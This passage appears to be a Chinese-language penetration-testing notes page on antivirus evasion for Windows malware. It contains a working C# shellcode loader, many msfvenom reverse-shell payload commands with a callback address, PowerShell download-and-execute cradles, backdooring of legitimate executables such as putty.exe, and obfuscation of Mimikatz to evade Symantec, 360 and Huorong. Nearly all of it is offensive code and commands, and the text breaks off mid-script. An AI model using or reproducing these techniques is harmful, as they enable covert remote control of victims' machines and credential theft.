/></p>\n<pre><code>编译解密\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Runtime.InteropServices;\nusing System.Threading;\nusing System.Reflection;\nusing System.Runtime.CompilerServices;\n\nnamespace NativePayload_Reverse_tcp\n&#123;\n\tpublic class Program\n&#123;\n\t\tpublic static void Main()\n\t\t&#123;\n\t\t\tShellcode.Exec();\n  &#125;\n&#125;\nclass Shellcode\n&#123;\n  public static void Exec()\n  &#123;\n    string Payload_Encrypted;\n    Payload_Encrypted = &quot;payload here&quot;;\n    string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');\n    byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];\n    for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)\n    &#123;\n      byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());\n      _X_to_Bytes[i] = current;\n    &#125;\n    // 解密密钥，可以更改，加解密源码中保持KEY一致就行\n\t\t\tbyte[] KEY = &#123; 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 &#125;;\n\t\t\tbyte[] MsfPayload = Decrypt(KEY, _X_to_Bytes);\n\t\t\t// 加载shellcode\n\t\t\tIntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);\n\t\t\tMarshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);\n\t\t\tCreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);\n\t\t\tThread.Sleep(2000);\n\t\t&#125;\n\t\tpublic static byte[] Decrypt(byte[] key, byte[] data)\n\t\t&#123;\n\t\t\treturn EncryptOutput(key, data).ToArray();\n\t\t&#125;\n\t\tprivate static byte[] EncryptInitalize(byte[] key)\n\t\t&#123;\n\t\t\tbyte[] s = Enumerable.Range(0, 256)\n\t\t\t.Select(i =&gt; (byte)i)\n\t\t\t.ToArray();\n\t\t\tfor (int i = 0, j = 0; i &lt; 256; i++)\n\t\t\t&#123;\n\t\t\t\tj = (j + key[i % key.Length] + s[i]) &amp; 255;\n\t\t\t\tSwap(s, i, j);\n\t\t\t&#125;\n\t\t\treturn s;\n\t\t&#125;\n\t\tprivate static IEnumerable&lt;byte&gt; EncryptOutput(byte[] key, IEnumerable&lt;byte&gt; data)\n\t\t&#123;\n\t\t\tbyte[] s = EncryptInitalize(key);\n\t\t\tint i = 0;\n\t\t\tint j = 0;\n\t\t\treturn data.Select((b) =&gt;\n\t\t\t&#123;\n\t\t\t\ti = (i + 1) &amp; 255;\n\t\t\t\tj = (j + s[i]) &amp; 255;\n\t\t\t\tSwap(s, i, j);\n\t\t\t\treturn (byte)(b ^ s[(s[i] + s[j]) &amp; 255]);\n\t\t\t\t&#125;);\n\t\t&#125;\n\t\tprivate static void Swap(byte[] s, int i, int j)\n\t\t&#123;\n\t\t\tbyte c = s[i];\n\t\t\ts[i] = s[j];\n\t\t\ts[j] = c;\n\t\t&#125;\n\t\t[DllImport(&quot;kernel32.dll&quot;)]\n\t\tpublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\t\t[DllImport(&quot;kernel32.dll&quot;)]\n\t\tpublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\t&#125;\n&#125;\n</code></pre>\n<h2 id=\"-231\"><a class=\"anchor\" href=\"#-231\">#</a> </h2>\n<h2 id=\"xoraes编码\"><a class=\"anchor\" href=\"#xoraes编码\">#</a> XOR/AES 编码</h2>\n<pre><code>与上文xor加密类似\n</code></pre>\n<h2 id=\"-232\"><a class=\"anchor\" href=\"#-232\">#</a> </h2>\n<h2 id=\"cscinstallutil\"><a class=\"anchor\" href=\"#cscinstallutil\">#</a> CSC+InstallUtil</h2>\n<pre><code>生成payload\nMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe\n&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt\nPayload粘贴到InstallUtil-Shellcode.cs中使用csc编译\n</code></pre>\n<p><img data-src=\"58.png\" alt=\"\" /></p>\n<pre><code>C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe /unsafe /platform:x86 /out:C:\\Users\\y\\Desktop\\shell.exe C:\\Users\\y\\Desktop\\InstallUtil-ShellCode.cs\n</code></pre>\n<p><img data-src=\"59.png\" alt=\"\" /></p>\n<pre><code>执行\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\y\\Desktop\\shell.exe\n</code></pre>\n<h3 id=\"python源码免杀\"><a class=\"anchor\" href=\"#python源码免杀\">#</a> Python 源码免杀</h3>\n<h2 id=\"-233\"><a class=\"anchor\" href=\"#-233\">#</a> </h2>\n<h2 id=\"pyinstaller加载c代码编译\"><a class=\"anchor\" href=\"#pyinstaller加载c代码编译\">#</a> pyinstaller 加载 C 代码编译</h2>\n<pre><code>生成C格式payload\nMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe\n&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c\n粘贴shellcode到shellcode+c.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\\Python27\\Scripts目录使用命令把py打包为exe\n&gt;python pyinstaller-script.py -F -w shellcode.py\n会在目录下生成dist文件夹，exe文件就在里面\n</code></pre>\n<h2 id=\"-234\"><a class=\"anchor\" href=\"#-234\">#</a> </h2>\n<h2 id=\"pyinstaller加载py代码编译\"><a class=\"anchor\" href=\"#pyinstaller加载py代码编译\">#</a> pyinstaller 加载 py 代码编译 (*)</h2>\n<pre><code>生成py格式payload\nMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe\n&gt;msfvenom -p windows/meterpreter/reverse_tcp LPORT=12138 LHOST=192.168.0.108 -e x86/shikata_ga_nai -i 11 -f py -o /var/www/html/1.py\n粘贴shellcode到shellcode+py.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\\Python27\\Scripts目录使用命令把py打包为exe\n&gt;python pyinstaller-script.py --console --onefile shellcode.py\n会在目录下生成dist文件夹，exe文件就在里面\n</code></pre>\n<p><img data-src=\"60.png\" alt=\"\" /><br />\n<img data-src=\"61.png\" alt=\"\" /><br />\n<img data-src=\"62.png\" alt=\"\" /></p>\n<h2 id=\"-235\"><a class=\"anchor\" href=\"#-235\">#</a> </h2>\n<h2 id=\"py2exe打包exe\"><a class=\"anchor\" href=\"#py2exe打包exe\">#</a> Py2exe 打包 exe</h2>\n<pre><code>生成raw格式payload\nMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe\n&gt;msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/shell.py\n在32位系统上安装python、py2exe\n创建setup.py放置同一目录\n</code></pre>\n<p><img data-src=\"63.png\" alt=\"\" /></p>\n<pre><code>from distutils.core import setup\nimport py2exe\nsetup(\nname = &quot;Meter&quot;,\ndescription = &quot;Python-based App&quot;,\nversion = &quot;1.0&quot;,\nconsole = [&quot;shell.py&quot;],\noptions = &#123;&quot;py2exe&quot;:&#123;&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,&#125;&#125;,\nzipfile = None\n)\n执行打包命令\n&gt;python setup.py py2exe\n会在当前目录生成dist文件夹，打包好的exe在里面\n</code></pre>\n<p><img data-src=\"64.png\" alt=\"\" /></p>\n<h2 id=\"-236\"><a class=\"anchor\" href=\"#-236\">#</a> </h2>\n<h2 id=\"base64编码pyinstaller打包\"><a class=\"anchor\" href=\"#base64编码pyinstaller打包\">#</a> Base64 编码 + Pyinstaller 打包</h2>\n<pre><code>MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe\n&gt;msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c\nShellcode粘贴在shellcode+base64+c.py中\n&gt;python pyinstaller-script.py -F -w shellcode.py\n会在目录下生成dist文件夹，exe文件就在里面\n</code></pre>\n<h2 id=\"-237\"><a class=\"anchor\" href=\"#-237\">#</a> </h2>\n<h2 id=\"加载器分离\"><a class=\"anchor\" href=\"#加载器分离\">#</a> 加载器分离</h2>\n<h2 id=\"-238\"><a class=\"anchor\" href=\"#-238\">#</a> </h2>\n<h3 id=\"hex\"><a class=\"anchor\" href=\"#hex\">#</a> hex</h3>\n<pre><code>生成c格式payload\n&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\\x00' lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c\n下载k8final\n</code></pre>\n<p><img data-src=\"65.png\" alt=\"\" /></p>\n<pre><code>粘贴shellcode进去\n</code></pre>\n<p><img data-src=\"66.png\" alt=\"\" /></p>\n<pre><code>使用\nhttps://github.com/k8gege/scrun\n</code></pre>\n<p><img data-src=\"67.png\" alt=\"\" /></p>\n<pre><code>或\n&gt;python scrun.py xxx\n或\n编译ScRunHex.py为exe\n</code></pre>\n<h2 id=\"-239\"><a class=\"anchor\" href=\"#-239\">#</a> </h2>\n<h3 id=\"base64\"><a class=\"anchor\" href=\"#base64\">#</a> Base64(*)</h3>\n<pre><code>生成c格式payload\n&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\\x00' lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c\n下载k8final\n</code></pre>\n<p><img data-src=\"68.png\" alt=\"\" /></p>\n<pre><code>粘贴shellcode进去\n</code></pre>\n<p><img data-src=\"69.png\" alt=\"\" /></p>\n<pre><code>进行hex编码后，粘贴进去base64编码\n</code></pre>\n<p><img data-src=\"70.png\" alt=\"\" /></p>\n<pre><code>看系统位数编译ScRunBase.py文件，使用pyinstaller打包为exe后执行\nhttps://gitee.com/RichChigga/scrun/blob/master/ScRunBase64.py\n&gt;python pyinstaller-script.py -F -w ScRunBase64.py\n</code></pre>\n<p><img data-src=\"71.png\" alt=\"\" /><br />\n<img data-src=\"72.png\" alt=\"\" /></p>\n<h3 id=\"dll劫持\"><a class=\"anchor\" href=\"#dll劫持\">#</a> DLL 劫持</h3>\n<pre><code>白dll劫持\nProcessmonitor查找程序加载的dll\n使用stud_pe加载dll进去\n或\n生成payload免杀好粘贴进去，查看目标上有什么软件，本地查找可劫持的dll,劫持好文件后传上去。\n</code></pre>\n<p><img data-src=\"73.png\" alt=\"\" /></p>\n<h3 id=\"msbuild\"><a class=\"anchor\" href=\"#msbuild\">#</a> MSBuild</h3>\n<pre><code>链接\nhttps://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml\n&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f csharp\n远程执行\n&gt;wmiexec.py &lt;USER&gt;:'&lt;PASS&gt;'@&lt;RHOST&gt; cmd.exe /c start %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \\\\&lt;attackerip&gt;\\&lt;share&gt;\\msbuild_nps.xml\n要设置自动迁移进程\n</code></pre>\n<p><img data-src=\"74.png\" alt=\"\" /></p>\n<h3 id=\"greatsct\"><a class=\"anchor\" href=\"#greatsct\">#</a> GreatSCT</h3>\n<pre><code>&gt;use Bypass\n&gt;list\n&gt;use regasm/meterpreter/rev_tcp.py\n&gt;msfconsole -r /usr/share/greatsct-output/handlers/payload.rc\n</code></pre>\n<h3 id=\"mshta\"><a class=\"anchor\" href=\"#mshta\">#</a> Mshta</h3>\n<pre><code>https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta\n生成\n&gt;msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.bin\n&gt;cat 1.bin |base64 -w 0\n</code></pre>\n<p><img data-src=\"75.png\" alt=\"\" /></p>\n<pre><code>编码后的内容复制到\n</code></pre>\n<p><img data-src=\"76.png\" alt=\"\" /></p>\n<pre><code>执行\n&gt;mshta http://192.168.0.106:1222/1.hta\n360执行检测出来，静态动态无法检测、火绒无法检测\n</code></pre>\n<h3 id=\"installutil\"><a class=\"anchor\" href=\"#installutil\">#</a> InstallUtil</h3>\n<pre><code>内网文章中有介绍\n</code></pre>\n<h3 id=\"veil\"><a class=\"anchor\" href=\"#veil\">#</a> Veil</h3>\n<pre><code>&gt;use 1选择evasion模块\n&gt;list查看可用payload\n&gt;use 7 选择c格式的payload\n&gt;set LHOST/LPORT设置回连IP和端口\n&gt;generate生成\n</code></pre>\n<p><img data-src=\"77.png\" alt=\"\" /></p>\n<pre><code>直接生成的exe可能会被查杀，目前可过360，不能过火绒\n使用minGW-w64编译C文件\n&gt;gcc -o vel.exe veil.c -l ws2_32\n</code></pre>\n<h3 id=\"rc4\"><a class=\"anchor\" href=\"#rc4\">#</a> RC4</h3>\n<pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 lhost=192.168.0.108 lport=3333 RC4PASSWORD=123qwe!@# -f c\n</code></pre>\n<h3 id=\"捆绑-2\"><a class=\"anchor\" href=\"#捆绑-2\">#</a> 捆绑</h3>\n<pre><code>&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -x PsExec64.exe  -i 15 -f exe -o /var/www/html/payload4.exe\n</code></pre>\n<h3 id=\"evasion模块\"><a class=\"anchor\" href=\"#evasion模块\">#</a> Evasion 模块</h3>\n<pre><code>&gt;show evasion\n</code></pre>\n<h3 id=\"phantom-evasion\"><a class=\"anchor\" href=\"#phantom-evasion\">#</a> Phantom-Evasion</h3>\n<p><img data-src=\"78.png\" alt=\"\" /><br />\n<img data-src=\"79.png\" alt=\"\" /></p>\n<h3 id=\"shellter\"><a class=\"anchor\" href=\"#shellter\">#</a> Shellter</h3>\n<pre><code>仅支持32位程序\n&gt;apt install shellter\n指定一个exe文件\n</code></pre>\n<p><img data-src=\"80.png\" alt=\"\" /></p>\n<pre><code>选择payload\n</code></pre>\n<h3 id=\"the-backdoor-factory\"><a class=\"anchor\" href=\"#the-backdoor-factory\">#</a> the-backdoor-factory</h3>\n<pre><code>查看是否支持捆绑\n&gt;python backdoor.py -f /root/Desktop/putty.exe -S\n查看此文件支持哪些payload\n&gt;python backdoor.py -f /root/Desktop/putty.exe -s show\nreverse_shell_tcp_inline对应msf\nset payload windows/meterpreter/reverse_tcp\nmeterpreter_reverse_https_threaded应msf\nset payload windows/meterpreter/reverse_https\niat_reverse_tcp_stager_threaded修复IAT\nuser_supplied_shellcode_threaded自定义payload\n参数\n-s 指定payload\n-H 回连地址\n-P 回连端口\n-J 多代码裂缝注入\n&gt;python backdoor.py -f ~/putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.0.108 -P 12138 -J -o payload.exe\n后门生成在backdoored目录\n或\n生成payload\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -i 5 -f raw -o shellcode.c\n自定义\n&gt;python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shellcode.c  -o payload2.exe\n</code></pre>\n<h3 id=\"zirikatu\"><a class=\"anchor\" href=\"#zirikatu\">#</a> zirikatu</h3>\n<p><img data-src=\"81.png\" alt=\"\" /></p>\n<h3 id=\"hanzoinjection\"><a class=\"anchor\" href=\"#hanzoinjection\">#</a> hanzoInjection</h3>\n<pre><code>https://github.com/P0cL4bs/hanzoInjection\n生成\n&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f raw -o /var/www/html/1.bin\n&gt;HanzoInjection.exe -p 1.bin -o 1.cs\n编译1.cs\n属性-生成-允许不安全代码\n</code></pre>\n<h2 id=\"powershell免杀\"><a class=\"anchor\" href=\"#powershell免杀\">#</a> PowerShell 免杀</h2>\n<h3 id=\"直接生成\"><a class=\"anchor\" href=\"#直接生成\">#</a> 直接生成</h3>\n<pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b '\\x00' lhost=192.168.0.108 lport=12138 -f psh -o /var/www/html/1.ps1\n执行\n&gt;powershell -ep bypass -noexit -file 1.ps1\nPowershell行为检测bypass\n&gt;powershell -noexit &quot;$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.0.108/1.ps1'')'.Replace('123','adString');IEX ($c1+$c2)&quot;\n</code></pre>\n<h3 id=\"invoke-shellcode加载\"><a class=\"anchor\" href=\"#invoke-shellcode加载\">#</a> Invoke-Shellcode 加载</h3>\n<pre><code>生成code\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f powershell -o /var/www/html/1.ps1\n目标执行\n&gt; powershell -ep bypass\n&gt; IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.108/ps/powersploit/CodeExecution/Invoke-Shellcode.ps1')\n&gt; IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.108/1.ps1')\n&gt; Invoke-Shellcode -Shellcode ($buf) -Force\n</code></pre>\n<p><img data-src=\"82.png\" alt=\"\" /><br />\n<img data-src=\"83.png\" alt=\"\" /></p>\n<pre><code>防护软件没反应\n</code></pre>\n<h3 id=\"invoke-obfuscation\"><a class=\"anchor\" href=\"#invoke-obfuscation\">#</a> Invoke-Obfuscation</h3>\n<pre><code>https://github.com/danielbohannon/Invoke-Obfuscation\n生成code\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f psh -o /var/www/html/1.ps1\n&gt;powershell -ep bypass\n&gt;Import-Module .\\Invoke-Obfuscation.psd1\n&gt;Invoke-Obfuscation\n&gt;set scriptpath C:\\Users\\y\\Desktop\\1.ps1\n&gt;encoding\n&gt;3 指定编码方式\n&gt;out C:\\Users\\y\\Desktop\\ok.ps1 保存\n</code></pre>\n<p><img data-src=\"84.png\" alt=\"\" /><br />\n<img data-src=\"85.png\" alt=\"\" /></p>\n<pre><code>执行\n&gt;powershell -ep bypass -noexit -file ok.ps1\n</code></pre>\n<p><img data-src=\"86.png\" alt=\"\" /><br />\n<img data-src=\"87.png\" alt=\"\" /><br />\n<img data-src=\"88.png\" alt=\"\" /></p>\n<h3 id=\"xencrypt\"><a class=\"anchor\" href=\"#xencrypt\">#</a> Xencrypt</h3>\n<pre><code>https://github.com/the-xentropy/xencrypt/blob/master/xencrypt.ps1\n&gt;Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100 递归分层躲避动态查杀\n</code></pre>\n<p><img data-src=\"89.png\" alt=\"\" /></p>\n<pre><code>&gt;Invoke-Xencrypt -infile .\\Invoke-Mimikatz.ps1 -outfile mimi.ps1\n</code></pre>\n<p><img data-src=\"90.png\" alt=\"\" /><br />\n<img data-src=\"91.png\" alt=\"\" /></p>\n<h3 id=\"pyfuscation\"><a class=\"anchor\" href=\"#pyfuscation\">#</a> PyFuscation</h3>\n<pre><code>https://github.com/CBHue/PyFuscation\n对函数，参数，变量进行混淆\n&gt;python3 PyFuscation.py -fvp --ps Invoke-Mimikatz.ps1\n</code></pre>\n<p><img data-src=\"92.png\" alt=\"\" /><br />\n<img data-src=\"93.png\" alt=\"\" /></p>\n<h3 id=\"拆分c编译\"><a class=\"anchor\" href=\"#拆分c编译\">#</a> 拆分 + C 编译</h3>\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nint main()&#123;\nsystem(&quot;powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://x.x.x.x/a'')'; $Text=$c2+$c3; IEX(-join $Text)&quot;);\nreturn 0;\n&#125;\n</code></pre>\n<h3 id=\"行为检测\"><a class=\"anchor\" href=\"#行为检测\">#</a> 行为检测</h3>\n<pre><code>&gt;powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal &quot;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1');Invoke-Mimikatz&quot;\n</code></pre>\n<h3 id=\"out-encryptedscript\"><a class=\"anchor\" href=\"#out-encryptedscript\">#</a> Out-EncryptedScript</h3>\n<pre><code>http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1\n&gt;Out-EncryptedScript -ScriptPath .\\Invoke-Mimikatz.ps1 -Password shabiisme -Salt 123456\n</code></pre>\n<p><img data-src=\"94.png\" alt=\"\" /><br />\n<img data-src=\"95.png\" alt=\"\" /></p>\n<pre><code>PS &gt; IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1&quot;)\nPS &gt; [String] $cmd = Get-Content .\\evil.ps1\nPS &gt; Invoke-Expression $cmd\nPS &gt; $decrypted = de shabiisme 123456\nPS &gt; Invoke-Expression $decrypted\nPS &gt; Invoke-Mimikatz\n</code></pre>\n<h3 id=\"cobalt-strike-powershell免杀\"><a class=\"anchor\" href=\"#cobalt-strike-powershell免杀\">#</a> cobalt strike powershell 免杀</h3>\n<pre><code>From: https://y4er.com/post/cobalt-strike-powershell-bypass/\npowershell&gt;$string = ''\npowershell&gt;$s = [Byte[]]$var_code = [System.Convert]::FromBase64String('[cs生成的shellcode]')\npowershell&gt;$s |foreach &#123; $string = $string + $_.ToString()+','&#125;\npowershell&gt;$string&gt;c:\\1.txt\n修改ps脚本\n[Byte[]]$var_code = [Byte[]](payload)\n再混淆一下函数和变量\n绕过执行命令的拦截\n使用cs的参数欺骗\nbeacon &gt; argue cmd.exe blablabla\n</code></pre>\n<h3 id=\"分块免杀\"><a class=\"anchor\" href=\"#分块免杀\">#</a> 分块免杀</h3>\n<pre><code>生成\nmsfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.0.108 LPORT=443 -f psh-net -o shity_shellcode.ps1\n</code></pre>\n<p><img data-src=\"700.png\" alt=\"\" /></p>\n<pre><code>先来测试一下，把ps1文件的shellcode换成一段无害的字符串\n</code></pre>\n<p><img data-src=\"701.png\" alt=\"\" /><br />\n<img data-src=\"702.png\" alt=\"\" /></p>\n<pre><code>结果发现还是被查杀了\n</code></pre>\n<p><img data-src=\"703.png\" alt=\"\" /></p>\n<pre><code>这表明大多数检测来自PowerShell模板，而不是Shellcode本身。\n下面几种bypass方法\n1.将字符串分成几部分并创建中间变量；\n2.添加大量垃圾备注；\n3.添加一些垃圾指令，例如循环或睡眠指令（对于沙盒有用）。\n[DllImport(&quot;kernel32.dll&quot;)]\n变为\n[DllImport(&quot;ke&quot;+&quot;rne&quot;+&quot;l32.dll&quot;)] #可绕过赛门铁克\n$przdE.ReferencedAssemblies.AddRange(@(&quot;System.dll&quot;,[PsObject].Assembly.Location))\n变为\n$magic=&quot;Syst&quot;+&quot;em&quot;+&quot;.dll&quot;;\n$przdE.ReferencedAssemblies.AddRange(@($magic,[PsObject].Assembly.Location))\n分割shellcode\n$sc0=&lt;shellcode的第1部分&gt;; …$sc7=&lt;shellcode的第8部分&gt;; [Byte[]]$tcomplete_sc=[System.Convert]::FromBase64String($sc0+$sc1+…+$sc7)\n一些细节可参照\nhttps://raw.githubusercontent.com/kmkz/Pentesting/master/AV_Evasion/AV_Bypass.ps1\n我不太懂汇编语言，所以没有添加无害指令。\n这里直接使用一键生成的bash脚本，有时间的可以读读里面的命令\nhttps://github.com/darksh3llRU/tools/blob/master/psh-net_shellcode_fastchange.sh\n这个脚本是生成个hta的，脚本以1337个字符来分块\n</code></pre>\n<p><img data-src=\"704.png\" alt=\"\" /></p>\n<pre><code>我测试的时候1337个字符会被赛门铁克查杀到，我这里修改成250个字符来分块\n</code></pre>\n<p><img data-src=\"705.png\" alt=\"\" /></p>\n<pre><code>因为我没加汇编指令，中间这里直接按任意键跳过即可，懂的可以在开头添加一些指令，例如xor，inc，dec，add，sub，mov，nop等\n</code></pre>\n<p><img data-src=\"706.png\" alt=\"\" /></p>\n<pre><code>执行完后会生成一些文件\n</code></pre>\n<p><img data-src=\"707.png\" alt=\"\" /></p>\n<pre><code>我们只用final_pshnet_revhttps.ps1这个文件，打开修改一下\n</code></pre>\n<p><img data-src=\"708.png\" alt=\"\" /></p>\n<pre><code>修改成\n</code></pre>\n<p><img data-src=\"709.png\" alt=\"\" /><br />\n<img data-src=\"710.png\" alt=\"\" /><br />\n<img data-src=\"711.png\" alt=\"\" /></p>\n<h2 id=\"ruby\"><a class=\"anchor\" href=\"#ruby\">#</a> Ruby</h2>\n<pre><code>目标机器装有ruby时\n生成\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f ruby\n粘贴到ruby中\n</code></pre>\n<p><img data-src=\"96.png\" alt=\"\" /></p>\n<pre><code>执行\n&gt;ruby xx.ruby\n</code></pre>\n<h2 id=\"golang\"><a class=\"anchor\" href=\"#golang\">#</a> Golang</h2>\n<pre><code>生成\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c\n代码转换成0x格式，粘贴到go.txt中保存为go格式\n</code></pre>\n<p><img data-src=\"97.png\" alt=\"\" /></p>\n<pre><code>安装golang环境在shellcode目录执行\n&gt;go build生成exe\n</code></pre>\n<h3 id=\"加载器\"><a class=\"anchor\" href=\"#加载器\">#</a> 加载器</h3>\n<h2 id=\"-240\"><a class=\"anchor\" href=\"#-240\">#</a> </h2>\n<h2 id=\"go-shellcode\"><a class=\"anchor\" href=\"#go-shellcode\">#</a> go-shellcode</h2>\n<pre><code>https://github.com/brimstone/go-shellcode\n进入cmd/sc目录编译sc.exe\n&gt;go build\n</code></pre>\n<p><img data-src=\"98.png\" alt=\"\" /></p>\n<pre><code>生成\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f hex -o shell.txt \n加载器加载shellcode\n&gt;sc.exe shellcode\n</code></pre>\n<p><img data-src=\"99.png\" alt=\"\" /></p>\n<h2 id=\"-241\"><a class=\"anchor\" href=\"#-241\">#</a> </h2>\n<h2 id=\"gsl\"><a class=\"anchor\" href=\"#gsl\">#</a> Gsl</h2>\n<pre><code>https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip\n&gt;gsl -s SHELLCODE -hex msf生成hex格式\n&gt;gsl -f shell.raw本地加载raw格式文件\n&gt;gsl -f shell.hex -hex 本地加载hex格式文件\n&gt;gsl -u http://192.168.0.108/1.raw 远程加载\n&gt;gsl -u http://192.168.0.108/1.hex\n</code></pre>\n<h1 id=\"内网域\"><a class=\"anchor\" href=\"#内网域\">#</a> 内网 &amp; 域</h1>\n<h2 id=\"powershell\"><a class=\"anchor\" href=\"#powershell\">#</a> Powershell</h2>\n<pre><code>查看版本$PSVersionTable\n</code></pre>\n<h3 id=\"远程执行\"><a class=\"anchor\" href=\"#远程执行\">#</a> 远程执行</h3>\n<pre><code>&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('');Invoke-xxx&quot;\n</code></pre>\n<p><img data-src=\"100.png\" alt=\"\" /></p>\n<h3 id=\"加载exe\"><a class=\"anchor\" href=\"#加载exe\">#</a> 加载 exe</h3>\n<pre><code>msfvenom生成exe木马\n#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe &gt; /var/www/html/1.exe  \n使用powersploit的Invoke-ReflectivePEInjection.ps1脚本\n#powershell.exe -w hidden -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR&quot; \n</code></pre>\n<h3 id=\"exe2ps1\"><a class=\"anchor\" href=\"#exe2ps1\">#</a> EXE2PS1</h3>\n<pre><code>http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1\n将exe转换为base64\n&gt;Import-Module .\\Convert-BinaryToString.ps1\n&gt;Convert-BinaryToString -FilePath .\\ms15051.exe\n</code></pre>\n<p><img data-src=\"101.png\" alt=\"\" /></p>\n<pre><code>http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1\nInvoke-ReflectivePEInjection.ps1文件头部添加\nFunction MS15051&#123;\n&lt;#\n.SYNOPSIS    \n.EXAMPLE\nC:\\PS&gt; MS15051 -Command &quot;whoami&quot;\n#&gt;\n [CmdletBinding()]\n    param(\n        [Parameter(Mandatory = $False)]\n        [string]\n        $Command\n  )\n$InputString = 